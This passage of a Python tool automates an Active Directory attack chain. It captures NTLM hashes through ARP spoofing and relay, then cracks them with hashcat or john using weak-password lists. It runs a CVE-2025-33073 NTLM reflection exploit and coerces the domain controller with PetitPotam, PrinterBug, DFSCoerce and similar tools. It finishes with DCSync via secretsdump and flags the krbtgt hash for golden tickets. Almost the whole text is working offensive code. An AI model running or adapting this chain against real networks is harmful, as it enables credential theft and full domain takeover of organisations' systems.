            log.info(f"🔀 Bettercap ARP spoof: {target} ↔ {gateway}")
            spoof_proc = run(
                ["bettercap", "-iface", iface, "-eval",
                 f"set arp.spoof.targets {target}; set arp.spoof.internal true; arp.spoof on"],
                cfg, bg=True, outfile=cfg.work_dir / "arp-spoof.txt"
            )
            if hasattr(spoof_proc, 'poll'):
                bg_procs.append(spoof_proc)
        else:
            log.info(f"🔀 ARP spoof: {target} → thinks we are {gateway}")
            p1 = run(
                ["arpspoof", "-i", iface, "-t", target, gateway],
                cfg, bg=True, outfile=cfg.work_dir / f"arp-spoof-{target}-1.txt"
            )
            log.info(f"🔀 ARP spoof: {gateway} → thinks we are {target}")
            p2 = run(
                ["arpspoof", "-i", iface, "-t", gateway, target],
                cfg, bg=True, outfile=cfg.work_dir / f"arp-spoof-{target}-2.txt"
            )
            for p in [p1, p2]:
                if hasattr(p, 'poll'):
                    bg_procs.append(p)

        # Wait for captured auth
        ok("ARP spoof + relay running, waiting for NTLM traffic...")
        max_wait = cfg.poison_duration
        waited = 0
        while waited < max_wait:
            if relay_output.exists():
                content = relay_output.read_text()
                if re.search(r"authenticated|SAM|hash|success|SUCCEED", content, re.IGNORECASE):
                    ok("🎣 Captured NTLM authentication!")
                    return True
            time.sleep(5)
            waited += 5
            if waited % 30 == 0:
                log.info(f"⏳ Still listening... ({waited}/{max_wait}s)")

        log.warning(f"No auth captured within {max_wait}s")
        return False

    finally:
        # Stop all background processes
        log.info("🛑 Stopping ARP spoof...")
        for proc in bg_procs:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        # Remove from global bg list
        for proc in bg_procs:
            if proc in cfg.bg_processes:
                cfg.bg_processes.remove(proc)
        # Restore IP forwarding
        try:
            Path("/proc/sys/net/ipv4/ip_forward").write_text(old_forward)
        except Exception:
            pass


def extract_hashes(cfg: Config) -> list[str]:
    """Extract NTLMv2 hashes from all output files."""
    hashfile = cfg.work_dir / "captured-ntlmv2.txt"
    hashes = set()

    # From relay/responder output
    for f in cfg.work_dir.glob("arp-relay-*.txt"):
        content = f.read_text()
        hashes.update(re.findall(r"\S+::\S+:[a-fA-F0-9]+:[a-fA-F0-9]+:[a-fA-F0-9]+", content))

    # From hash output files
    for f in cfg.work_dir.glob("arp-relay-hashes*"):
        if f.exists():
            hashes.update(line.strip() for line in f.read_text().splitlines() if "::" in line)

    # Responder logs
    responder_dir = Path("/usr/share/responder/logs")
    if responder_dir.is_dir():
        for f in responder_dir.glob("*NTLMv2*.txt"):
            hashes.update(line.strip() for line in f.read_text().splitlines() if "::" in line)

    if hashes:
        hashfile.write_text("\n".join(sorted(hashes)) + "\n")
        ok(f"Extracted {len(hashes)} unique NTLMv2 hash(es)")
    return sorted(hashes)


def try_crack_hashes(cfg: Config) -> Optional[tuple[str, str, str]]:
    """Crack NTLMv2 hashes. Returns (user, password, domain) or None."""
    hashfile = cfg.work_dir / "captured-ntlmv2.txt"
    cracked_file = cfg.work_dir / "cracked.txt"

    if not hashfile.exists() or hashfile.stat().st_size == 0:
        return None

    log.info("🔓 Attempting to crack NTLMv2 hashes...")

    # Quick check: extract usernames from hashes and try username=password
    # NTLMv2 format: USER::DOMAIN:challenge:response:blob
    usernames = set()
    for line in hashfile.read_text().splitlines():
        if "::" in line:
            user = line.split("::")[0].strip()
            if user:
                usernames.add(user)

    if usernames:
        # Build a mini wordlist with common weak patterns per user
        mini_wl = cfg.work_dir / "quick-crack-wordlist.txt"
        patterns = []
        for u in usernames:
            patterns += [
                u, u.lower(), u.upper(), u.capitalize(),
                f"{u}1", f"{u}123", f"{u}!", f"{u}1!",
                u[::-1],  # reversed
            ]
        # Add generic weak passwords
        patterns += [
            "password", "Password1", "Password123", "P@ssw0rd", "P@ssword1",
            "Welcome1", "Welcome123", "Changeme1", "Winter2024", "Winter2025",
            "Winter2026", "Summer2024", "Summer2025", "Summer2026",
            "Company1", "Company123", "Admin123", "admin", "letmein",
            "qwerty", "123456", "abc123", "iloveyou", "monkey",
        ]
        mini_wl.write_text("\n".join(patterns) + "\n")
        log.info(f"⚡ Quick-crack: trying {len(patterns)} username-based patterns first...")

        if tool_exists("hashcat"):
            run(
                ["hashcat", "-m", "5600", str(hashfile), str(mini_wl),
                 "--outfile", str(cracked_file), "--outfile-format=2", "--quiet",
                 "--runtime=10"],
                cfg, timeout=15
            )
        elif tool_exists("john"):
            run(["john", "--format=netntlmv2", f"--wordlist={mini_wl}", str(hashfile),
                 "--max-run-time=10"],
                cfg, timeout=15)

        if cracked_file.exists() and cracked_file.stat().st_size > 0:
            ok("⚡ Quick-crack hit! Username-based password found")

    # Find wordlist (prefer uncompressed, auto-decompress .gz)
    wordlist = None
    for wl in WORDLISTS:
        if wl.exists() and wl.suffix != ".gz":
            wordlist = wl
            break
        if wl.suffix == ".gz" and wl.exists():
            plain = wl.with_suffix("")
            if plain.exists():
                wordlist = plain
                break
            log.info(f"📦 Decompressing {wl.name}...")
            run(["gunzip", "-k", str(wl)], cfg)
            if plain.exists():
                wordlist = plain
                break

    if not wordlist:
        log.warning("No wordlist found for cracking")
        return None

    if tool_exists("hashcat"):
        log.info(f"⚙️  hashcat (NTLMv2/5600) with {wordlist.name}...")
        result = run(
            ["hashcat", "-m", "5600", str(hashfile), str(wordlist),
             "--outfile", str(cracked_file), "--outfile-format=2", "--quiet",
             "--runtime=90"],  # Hard cap: 90 seconds
            cfg, timeout=120   # Process kill safety net
        )
    elif tool_exists("john"):
        log.info(f"⚙️  john the ripper with {wordlist.name}...")
        run(["john", "--format=netntlmv2", f"--wordlist={wordlist}", str(hashfile),
             f"--max-run-time=90"],  # Hard cap: 90 seconds
            cfg, timeout=120)
        result = run(["john", "--show", "--format=netntlmv2", str(hashfile)], cfg)
        if result.stdout:
            lines = [l for l in result.stdout.splitlines()
                     if l.strip() and "password hash" not in l.lower()]
            cracked_file.write_text("\n".join(lines) + "\n")
    else:
        log.warning("Neither hashcat nor john found")
        return None

    if cracked_file.exists() and cracked_file.stat().st_size > 0:
        cracked_pass = _first_line(cracked_file.read_text())
        # Parse user::domain from the hash
        hash_line = _first_line(hashfile.read_text())
        parts = hash_line.split(":")
        user = parts[0] if len(parts) > 0 else ""
        domain = parts[2] if len(parts) > 2 else ""

        # john output may include "user:pass"
        if ":" in cracked_pass and "\\" not in cracked_pass:
            cracked_pass = cracked_pass.split(":", 1)[-1]

        if user and cracked_pass:
            success_box(f"CRACKED: {domain}\\{user}")
            detail(f"Password: {cracked_pass}")
            return (user, cracked_pass, domain)

    log.warning("No passwords cracked with quick wordlist attack")
    return None


def run_arp_capture(cfg: Config, priority_hosts: list[str] | None = None) -> bool:
    """ARP spoof subnet to capture and crack NTLM hashes. Sets cfg creds on success.

    Args:
        priority_hosts: Hosts from passive sniffing that are actively sending
                       LLMNR/WPAD/WSUS/DHCPv6 traffic — these are spoofed first
                       since they're most likely to yield NTLM auth.
    """
    phase_header("PHASE 0: ZERO-AUTH CREDENTIAL CAPTURE (ARP SPOOF)")

    targets = []
    if cfg.specific_target:
        targets = [cfg.specific_target]
    elif cfg.target_net:
        targets = discover_live_hosts(cfg)
    else:
        log.error("No target specified and no subnet detected")
        return False

    if not targets:
        return False

    # Prioritize hosts from passive sniffing (they're actively authenticating)
    if priority_hosts:
        priority = [h for h in priority_hosts if h in targets and h != cfg.attacker_ip]
        rest = [h for h in targets if h not in priority]
        if priority:
            ok(f"Prioritizing {len(priority)} host(s) detected by passive sniff")
            for h in priority:
                detail(h)
            targets = priority + rest

    total = len(targets)
    for i, host in enumerate(targets, 1):
        log.info(f"[{i}/{total}] ARP spoof relay: {host} ↔ {cfg.gateway}")
        arp_spoof_relay(host, cfg)

        # Check for captured hashes
        hashes = extract_hashes(cfg)
        if hashes:
            creds = try_crack_hashes(cfg)
            if creds:
                cfg.username, cfg.password, cfg.domain = creds
                ok("🔑 Credentials captured and cracked — switching to authenticated mode")
                return True

    # Final crack attempt
    hashes = extract_hashes(cfg)
    if hashes:
        creds = try_crack_hashes(cfg)
        if creds:
            cfg.username, cfg.password, cfg.domain = creds
            return True

    return False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phase 1: Enumeration
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def enumerate_targets(cfg: Config) -> tuple[list[str], list[str]]:
    """Find relay targets and delegation hosts. Returns (relay_targets, deleg_hosts)."""
    phase_header(f"PHASE 1: TARGET ENUMERATION ({cfg.target_net})")

    relay_list = cfg.work_dir / "relay-targets.txt"
    smb_output = cfg.work_dir / "smb-enum.txt"
    deleg_output = cfg.work_dir / "delegation.txt"

    # --- SMB signing scan ---
    log.info("🔍 Scanning for hosts without SMB signing...")
    result = run(
        ["nxc", "smb", cfg.target_net, "--gen-relay-list", str(relay_list)],
        cfg, timeout=300, outfile=smb_output
    )
    print(result.stdout)

    relay_targets = []
    if relay_list.exists():
        relay_targets = [l.strip() for l in relay_list.read_text().splitlines() if l.strip()]

    # Remove DC (always has signing)
    if cfg.dc_ip in relay_targets:
        relay_targets.remove(cfg.dc_ip)
        relay_list.write_text("\n".join(relay_targets) + "\n")

    if relay_targets:
        ok(f"Found {len(relay_targets)} relay target(s)")
        for t in relay_targets:
            detail(t)
    else:
        log.warning("No relay targets found (all hosts have SMB signing)")
        log.warning("Try --smb-signing to relay via LDAPS instead")

    # --- Delegation scan ---
    separator()
    log.info("🔍 Looking for unconstrained delegation hosts...")
    result = run(
        ["impacket-findDelegation"] + cfg.auth_args + ["-dc-ip", cfg.dc_ip],
        cfg, timeout=60, outfile=deleg_output
    )
    print(result.stdout)

    deleg_hosts = []
    if deleg_output.exists():
        for line in deleg_output.read_text().splitlines():
            if re.search(r"unconstrained", line, re.IGNORECASE):
                parts = line.split()
                if len(parts) >= 2:
                    deleg_hosts.append(parts[1])

    if deleg_hosts:
        ok(f"Unconstrained delegation host(s) found:")
        (cfg.work_dir / "unconstrained-hosts.txt").write_text("\n".join(deleg_hosts) + "\n")
        for h in deleg_hosts:
            detail(h)
    else:
        log.warning("No unconstrained delegation — DC compromise phase will be limited")

    # --- Cross-reference: high-value targets ---
    high_value = []
    if deleg_hosts and relay_targets and tool_exists("dig"):
        separator()
        log.info("🔗 Cross-referencing relay targets with delegation hosts...")
        for dh in deleg_hosts:
            try:
                out = subprocess.check_output(
                    ["dig", "+short", "A", f"{dh}.{cfg.domain}"], text=True, timeout=5,
                    stderr=subprocess.DEVNULL
                )
                ip = out.strip().splitlines()[0] if out.strip() else ""
                if ip in relay_targets:
                    ok(f"🎯 HIGH VALUE: {dh} ({ip}) — relay + unconstrained delegation")
                    high_value.append(ip)
            except Exception:
                pass

    if high_value:
        (cfg.work_dir / "high-value-targets.txt").write_text("\n".join(high_value) + "\n")

    return relay_targets, deleg_hosts


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phase 2: CVE-2025-33073 Exploitation
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def run_cve_exploit(target: str, method: str, cfg: Config,
                    label: str = "") -> bool:
    """Run the CVE-2025-33073 PoC with a specific method."""
    output_file = cfg.work_dir / f"exploit-{target}-{method}.txt"
    args = [
        "python3", str(CVE_DIR / "CVE-2025-33073.py"),
        "-u", f"{cfg.domain}\\{cfg.username}",
        "--attacker-ip", cfg.attacker_ip,
        "--dns-ip", cfg.dc_ip,
        "--dc-fqdn", cfg.dc_fqdn,
        "--target", target,
        "--target-ip", target,
    ]

    # Auth
    if cfg.nthash:
        args += ["-p", f"aad3b435b51404eeaad3b435b51404ee:{cfg.nthash}"]
    else:
        args += ["-p", cfg.password]

    if method:
        args += ["-M", method]
    if cfg.use_socks:
        args += ["--socks"]
    if cfg.smb_signing:
        args += ["--smb-signing"]
    if cfg.custom_cmd:
        args += ["--custom-command", cfg.custom_cmd]

    log.info(f"⚔️  {label or 'Exploit'}: method={method}")
    result = run(args, cfg, timeout=300, outfile=output_file)
    if not cfg.dry_run:
        print(result.stdout[-2000:] if len(result.stdout) > 2000 else result.stdout)
    return result.returncode == 0


def exploit_target(target: str, cfg: Config) -> bool:
    """Exploit a target with fallback coercion methods."""
    phase_header(f"PHASE 2: NTLM REFLECTION EXPLOIT ({target})")

    if cfg.use_socks:
        log.info("🧦 SOCKS proxy mode — post-exploit: proxychains nxc smb ...")
    if cfg.smb_signing:
        log.info("🔏 SMB signing bypass enabled (LDAPS relay)")
    if cfg.custom_cmd:
        log.info(f"💻 Custom command: {cfg.custom_cmd}")

    # User specified a method — no fallback
    if cfg.method:
        success = run_cve_exploit(target, cfg.method, cfg)
        if success:
            ok(f"Exploitation succeeded on {target} (method: {cfg.method})")
            (cfg.work_dir / f"working-method-{target}.txt").write_text(cfg.method)
        else:
            log.error(f"Exploitation failed on {target} (method: {cfg.method})")
        return success

    # Auto-fallback: try each method
    total = len(COERCION_METHODS)
    for i, method in enumerate(COERCION_METHODS, 1):
        if run_cve_exploit(target, method, cfg, label=f"Attempt {i}/{total}"):
            ok(f"Exploitation succeeded on {target} (method: {method})")
            (cfg.work_dir / f"working-method-{target}.txt").write_text(method)
            return True
        if i < total:
            log.warning(f"Method {method} failed, trying next...")

    # Retry all with SMB signing bypass
    if not cfg.smb_signing:
        log.warning("All standard methods failed — retrying with --smb-signing (LDAPS)...")
        cfg.smb_signing = True
        for method in COERCION_METHODS:
            if run_cve_exploit(target, method, cfg, label=f"SMB-signing bypass ({method})"):
                ok(f"Exploitation succeeded (method: {method} + smb-signing)")
                (cfg.work_dir / f"working-method-{target}.txt").write_text(f"{method}+smb-signing")
                cfg.smb_signing = False
                return True
        cfg.smb_signing = False

    # Last resort: ARP spoof
    if not cfg.no_arp:
        log.warning("All coercion methods failed — falling back to ARP spoof relay...")
        if arp_spoof_relay(target, cfg):
            ok(f"ARP spoof relay succeeded on {target}")
            (cfg.work_dir / f"working-method-{target}.txt").write_text("arp-spoof")
            return True

    fail_box(f"All methods exhausted on {target}")
    return False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phase 3: DC Compromise
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def try_dc_coercion(listener: str, cfg: Config) -> bool:
    """Try multiple coercion tools against the DC. Returns True on success."""
    coerce_output = cfg.work_dir / "coercion.txt"

    methods = [
        ("PetitPotam (MS-EFSR)", _coerce_petitpotam),
        ("PrinterBug (MS-RPRN)", _coerce_printerbug),
        ("DFSCoerce (MS-DFSNM)", _coerce_dfscoerce),
        ("ShadowCoerce (MS-FSRVP)", _coerce_shadowcoerce),
        ("Coercer (all-in-one)", _coerce_coercer),
    ]

    for i, (name, func) in enumerate(methods, 1):
        log.info(f"🔨 DC coercion [{i}/{len(methods)}]: {name}")
        if func(listener, cfg, coerce_output):
            ok(f"{name} coercion succeeded")
            (cfg.work_dir / "working-coercion.txt").write_text(name)
            return True
        if i < len(methods):
            log.warning(f"{name} failed, trying next...")

    log.error("All DC coercion methods failed")
    return False


def _build_coerce_auth(cfg: Config) -> list[str]:
    if cfg.nthash:
        return ["-u", cfg.username, "-d", cfg.domain, "-hashes", f":{cfg.nthash}"]
    return ["-u", cfg.username, "-d", cfg.domain, "-p", cfg.password]


def _coerce_petitpotam(listener: str, cfg: Config, outfile: Path) -> bool:
    cmd = find_tool(
        "impacket-PetitPotam",
        paths=[Path("/usr/share/doc/python3-impacket/examples/PetitPotam.py")]
    )
    if not cmd:
        log.warning("PetitPotam not found, skipping")
        return False
    parts = cmd.split() + _build_coerce_auth(cfg) + [listener, cfg.dc_ip]
    result = run(parts, cfg, timeout=60, outfile=outfile)
    return _check_coerce_output(result, outfile)


def _coerce_printerbug(listener: str, cfg: Config, outfile: Path) -> bool:
    cmd = find_tool(
        "printerbug.py",
        paths=[TOOLS_DIR / "krbrelayx" / "printerbug.py"]
    )
    if not cmd:
        log.warning("PrinterBug not found, skipping")
        return False
    if cfg.nthash:
        auth = f"{cfg.domain}/{cfg.username}@{cfg.dc_ip} -hashes :{cfg.nthash}"
    else:
        auth = f"{cfg.domain}/{cfg.username}:{cfg.password}@{cfg.dc_ip}"
    parts = cmd.split() + auth.split() + [listener]
    result = run(parts, cfg, timeout=60, outfile=outfile)
    return _check_coerce_output(result, outfile)


def _coerce_dfscoerce(listener: str, cfg: Config, outfile: Path) -> bool:
    cmd = find_tool(
        "dfscoerce.py", "DFSCoerce.py",
        paths=[TOOLS_DIR / "DFSCoerce" / "dfscoerce.py"]
    )
    if not cmd:
        log.warning("DFSCoerce not found, skipping")
        return False
    parts = cmd.split() + _build_coerce_auth(cfg) + [listener, cfg.dc_ip]
    result = run(parts, cfg, timeout=60, outfile=outfile)
    return _check_coerce_output(result, outfile)


def _coerce_shadowcoerce(listener: str, cfg: Config, outfile: Path) -> bool:
    cmd = find_tool(
        "shadowcoerce.py", "ShadowCoerce.py",
        paths=[TOOLS_DIR / "ShadowCoerce" / "shadowcoerce.py"]
    )
    if not cmd:
        log.warning("ShadowCoerce not found, skipping")
        return False
    parts = cmd.split() + _build_coerce_auth(cfg) + [listener, cfg.dc_ip]
    result = run(parts, cfg, timeout=60, outfile=outfile)
    return _check_coerce_output(result, outfile)


def _coerce_coercer(listener: str, cfg: Config, outfile: Path) -> bool:
    if not tool_exists("coercer"):
        log.warning("Coercer not found (pip install coercer)")
        return False
    auth = _build_coerce_auth(cfg)
    parts = ["coercer", "coerce"] + auth + ["--listener", listener, "--target", cfg.dc_ip]
    result = run(parts, cfg, timeout=120, outfile=outfile)
    return _check_coerce_output(result, outfile)


def _check_coerce_output(result: subprocess.CompletedProcess, outfile: Path) -> bool:
    text = result.stdout or ""
    if outfile.exists():
        text += outfile.read_text()
    return bool(re.search(r"triggered|success|got.*handle|vulnerable", text, re.IGNORECASE))


def dcsync_attack(target: str, cfg: Config):
    """DC compromise: relay listener → coerce DC → DCSync."""
    phase_header("PHASE 3: DOMAIN CONTROLLER COMPROMISE")

    # Find delegation host
    deleg_host = ""
    hv_file = cfg.work_dir / "high-value-targets.txt"
    uc_file = cfg.work_dir / "unconstrained-hosts.txt"
    if hv_file.exists():
        deleg_host = _first_line(hv_file.read_text())
        if deleg_host:
            ok(f"🎯 Using high-value target (relay + delegation): {deleg_host}")
    elif uc_file.exists():
        line = _first_line(uc_file.read_text())
        deleg_host = line.split()[0] if line.split() else ""

    if not deleg_host:
        log.warning("No unconstrained delegation host found")
        log.warning("Attempting direct DCSync with current credentials...")
        _run_secretsdump(cfg)
        return

    ok(f"Using delegation host: {deleg_host}")

    # Exploit delegation host if needed
    if deleg_host != target:
        log.info(f"🔓 Exploiting delegation host {deleg_host}...")
        if not exploit_target(deleg_host, cfg):
            log.error("Failed to compromise delegation host")
            log.warning("Attempting direct DCSync anyway...")
            _run_secretsdump(cfg)
            return

    if cfg.dry_run:
        log.warning("Dry run — would start relay → coerce DC → DCSync")
        return

    # Start ntlmrelayx listener BEFORE coercion
    log.info("🎣 Starting ntlmrelayx listener for DC authentication...")
    relay_output = cfg.work_dir / "dc-relay.txt"
    relay_proc = run(
        ["impacket-ntlmrelayx", "-t", cfg.dc_ip, "-smb2support", "--no-http-server"],
        cfg, bg=True, outfile=relay_output
    )

    if not hasattr(relay_proc, 'poll'):
        log.error("Failed to start ntlmrelayx for DCSync relay")
        log.warning("Attempting direct DCSync instead...")
        _run_secretsdump(cfg)
        return

    time.sleep(2)
    if relay_proc.poll() is not None:
        log.error(f"ntlmrelayx exited immediately (code {relay_proc.returncode})")
        log.warning("Attempting direct DCSync instead...")
        _run_secretsdump(cfg)
        return

    ok(f"ntlmrelayx listener running (PID: {relay_proc.pid})")

    try:
        # Coerce DC
        log.info("🔨 Coercing DC authentication (with fallback methods)...")
        coercion_ok = try_dc_coercion(deleg_host, cfg)

        if coercion_ok:
            log.info("⏳ Waiting for relay to process captured auth...")
            time.sleep(5)

        # Check relay output
        if relay_output.exists():
            content = relay_output.read_text()
            if re.search(r"authenticated|SAM|NTDS|success", content, re.IGNORECASE):
                ok("🎣 Relay captured DC authentication!")
    finally:
        # Always stop the relay process
        try:
            relay_proc.terminate()
            relay_proc.wait(timeout=5)
        except Exception:
            try:
                relay_proc.kill()
            except Exception:
                pass
        if relay_proc in cfg.bg_processes:
            cfg.bg_processes.remove(relay_proc)

    # DCSync
    _run_secretsdump(cfg)


def _run_secretsdump(cfg: Config):
    log.info("🗝️  Attempting DCSync...")
    dump_file = cfg.work_dir / "secretsdump.txt"

    # Use DC IP as target (FQDN may not resolve from attacker box)
    target = cfg.dc_ip or cfg.dc_fqdn
    args = [
        "impacket-secretsdump",
        f"{cfg.auth_string}@{target}",
        "-dc-ip", cfg.dc_ip, "-just-dc"
    ]
    if cfg.nthash:
        args += ["-hashes", f":{cfg.nthash}"]

    result = run(args, cfg, timeout=300, outfile=dump_file)
    print(result.stdout[-3000:] if len(result.stdout) > 3000 else result.stdout)

    _check_dcsync_result(cfg)


def _check_dcsync_result(cfg: Config):
    dump_file = cfg.work_dir / "secretsdump.txt"
    if dump_file.exists() and ":::" in dump_file.read_text():
        content = dump_file.read_text()
        hash_count = content.count(":::")
        success_box("DCSync SUCCESSFUL — Domain Compromised!")
        ok(f"Extracted {hash_count} credential entries")
        detail(f"📁 Hashes saved to: {dump_file}")

        # krbtgt
        for line in content.splitlines():
            if line.startswith("krbtgt:"):
                print(f"\n{C.BOLD_YELLOW}  👑 krbtgt hash recovered — GOLDEN TICKET possible:{C.NC}")
                print(f"{C.BOLD}  {line}{C.NC}")
                break
    else:
        fail_box("DCSync did not return hashes")
        log.warning("If you captured a TGT via Rubeus, convert and use:")
        detail(f"export KRB5CCNAME={cfg.work_dir}/dc_tgt.ccache")
        detail(f"impacket-secretsdump -k -no-pass {cfg.dc_fqdn}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DNS Cleanup
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def cleanup_dns_records(cfg: Config):
    if cfg.no_cleanup:
        log.warning("Skipping DNS cleanup (--no-cleanup)")
        return

    # Discover injected records first — no point complaining about a missing
    # tool when the chain didn't inject anything in the first place
    records = []
    for f in cfg.work_dir.glob("exploit-*.txt"):
        content = f.read_text()
        matches = re.findall(r"(?:Adding DNS record[:\s]+|record.*name[:\s]+)(\S+)", content)
        records.extend(matches)

    if not records:
        return  # nothing to clean — stay quiet

    log.info("🧹 Cleaning up injected DNS records...")

    dnstool = find_tool(
        "dnstool.py",
        paths=[CVE_DIR / "dnstool.py", TOOLS_DIR / "krbrelayx" / "dnstool.py"]
    )
    if not dnstool:
        log.warning(f"dnstool.py not found — cannot auto-cleanup {len(set(records))} DNS record(s)")
        return

    for record in set(records):
        log.info(f"🗑️  Removing DNS record: {record}")
        parts = dnstool.split() + ["-u", cfg.auth_string, "-dc-ip", cfg.dc_ip,
                                    "-a", "remove", "-r", record]
        run(parts, cfg, timeout=30)

    ok("DNS cleanup complete")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Passive Traffic Discovery (WPAD / WSUS / LLMNR / DHCPv6)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def passive_sniff(cfg: Config, duration: int = 30) -> dict:
    """Passively sniff the network to detect WPAD, WSUS, LLMNR, DHCPv6, and PXE/TFTP traffic.

    Uses tcpdump to listen for:
    - LLMNR queries (UDP 5355) — indicates WPAD poisoning is viable
    - mDNS queries (UDP 5353) — WPAD via mDNS
    - DHCPv6 solicitations (UDP 547) — mitm6 attack is viable
    - WSUS HTTP traffic (TCP 8530/8531) — active WSUS clients
    - DNS queries for 'wpad' — WPAD in use
    - NBT-NS queries (UDP 137) — NetBIOS name resolution for WPAD
    - DHCP PXE boot (UDP 67/68) — PXE boot environment present
    - TFTP traffic (UDP 69) — PXE image transfer or other unauth file transfers
    - SCCM ProxyDHCP (UDP 4011) — SCCM PXE Distribution Point

    Returns dict with keys: wpad_llmnr, wpad_mdns, wpad_dns, dhcpv6, wsus, nbtns, pxe, tftp
    each containing a list of source IPs seen.
    """
    phase_header("PASSIVE NETWORK DISCOVERY")
    log.info(f"👂 Listening passively for {duration}s to detect WPAD/WSUS/PXE/LLMNR/DHCPv6 traffic...")

    results = {
        "wpad_llmnr": set(),
        "wpad_mdns": set(),
        "wpad_dns": set(),
        "dhcpv6": set(),
        "wsus": set(),
        "nbtns": set(),
        "pxe": set(),
        "tftp": set(),
        "domains": set(),   # Domain names seen in traffic
    }

    if not tool_exists("tcpdump"):
        log.warning("tcpdump not found — skipping passive discovery (apt install tcpdump)")
        return {k: list(v) for k, v in results.items()}

    iface = cfg.iface or "eth0"
    capture_file = cfg.work_dir / "passive-capture.txt"

    # Capture filter: LLMNR, mDNS, DHCPv6, WSUS, DNS, NBT-NS, PXE/DHCP, TFTP, SCCM
    bpf = (
        "udp port 5355 or "         # LLMNR
        "udp port 5353 or "         # mDNS
        "udp port 547 or "          # DHCPv6
        "tcp port 8530 or "         # WSUS HTTP
        "tcp port 8531 or "         # WSUS HTTPS
        "udp port 53 or "           # DNS
        "udp port 137 or "          # NBT-NS
        "udp port 67 or "           # DHCP server (PXE boot requests)
        "udp port 68 or "           # DHCP client
        "udp port 69 or "           # TFTP (PXE image transfers)
        "udp port 4011"             # SCCM ProxyDHCP
    )

    # Run tcpdump for the full duration — timeout is the only limit
    # (no -c flag, so it captures all packets until timeout expires)
    log.info(f"Capturing for {duration}s on {iface}...")
    result = run(
        ["tcpdump", "-i", iface, "-n", "-l", bpf],
        cfg, timeout=duration, capture=True,
        outfile=capture_file
    )

    if not capture_file.exists():
        log.warning("No traffic captured")
        return {k: list(v) for k, v in results.items()}

    content = capture_file.read_text()

    for line in content.splitlines():
        src_match = re.match(r"[\d:.]+ IP6? (\S+?)[\.\d]* > ", line)
        if not src_match:
            src_match = re.match(r"[\d:.]+ (\d+\.\d+\.\d+\.\d+)\.\d+ > ", line)
        src_ip = src_match.group(1) if src_match else ""

        line_lower = line.lower()

        # LLMNR (port 5355)
        if ".5355" in line and src_ip:
            if "wpad" in line_lower:
                results["wpad_llmnr"].add(src_ip)
            else:
                results["wpad_llmnr"].add(src_ip)  # Any LLMNR = poisoning viable

        # mDNS (port 5353)
        if ".5353" in line and "wpad" in line_lower and src_ip:
            results["wpad_mdns"].add(src_ip)

        # DHCPv6 (port 547) — Solicit messages
        if ".547" in line and src_ip:
            results["dhcpv6"].add(src_ip)

        # WSUS traffic (ports 8530/8531)
        if (".8530" in line or ".8531" in line) and src_ip:
            results["wsus"].add(src_ip)

        # DNS queries for wpad
        if "53" in line and "wpad" in line_lower and src_ip:
            results["wpad_dns"].add(src_ip)

        # NBT-NS (port 137) — wpad queries
        if ".137" in line and "wpad" in line_lower and src_ip:
            results["nbtns"].add(src_ip)

        # PXE boot — DHCP with PXEClient vendor class or boot filename
        if (".67" in line or ".68" in line) and src_ip:
            if "pxe" in line_lower or "boot" in line_lower or "wds" in line_lower:
                results["pxe"].add(src_ip)

        # TFTP traffic (port 69) — image transfer, no authentication
        if ".69" in line and src_ip:
            results["tftp"].add(src_ip)

        # SCCM ProxyDHCP (port 4011)
        if ".4011" in line and src_ip:
            results["pxe"].add(src_ip)

        # Extract domain names from DNS queries, Kerberos, LDAP, SMB traffic
        # DNS queries: "A? dc01.corp.local" or "SRV? _ldap._tcp.corp.local"
        dns_match = re.findall(r"[A-Z]+\?\s+\S+?\.([a-zA-Z0-9-]+\.[a-zA-Z]{2,}(?:\.[a-zA-Z]{2,})?)", line)
        for dom in dns_match:
            dom = dom.lower().rstrip(".")
            # Filter out non-AD domains
            if dom and not dom.endswith((".in-addr.arpa", ".ip6.arpa", ".cloudfront.net",
                                         ".googleapis.com", ".amazonaws.com", ".azure.com",
                                         ".microsoft.com", ".windows.com", ".akamai.net",
                                         ".google.com", ".gstatic.com")):
                results["domains"].add(dom)

        # Kerberos: realm names in AS-REQ/TGS-REQ
        krb_match = re.findall(r"realm[:\s]+([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})", line, re.IGNORECASE)
        for dom in krb_match:
            results["domains"].add(dom.lower())

        # NTLM: domain names in NTLMSSP messages
        ntlm_match = re.findall(r"NTLMSSP.*?(?:Domain|Target)[:\s]+([a-zA-Z0-9.-]+)", line, re.IGNORECASE)
        for dom in ntlm_match:
            if "." in dom:
                results["domains"].add(dom.lower())

    # Report findings
    separator()
    found_anything = False

    if results["wpad_llmnr"]:
        ok(f"📡 LLMNR queries detected from {len(results['wpad_llmnr'])} host(s) — WPAD poisoning viable")
        for ip in sorted(results["wpad_llmnr"]):
            detail(ip)
        found_anything = True

    if results["wpad_dns"]:
        ok(f"🌐 WPAD DNS queries from {len(results['wpad_dns'])} host(s)")
        for ip in sorted(results["wpad_dns"]):
            detail(ip)
        found_anything = True

    if results["dhcpv6"]:
        ok(f"🔌 DHCPv6 solicitations from {len(results['dhcpv6'])} host(s) — mitm6 attack viable")
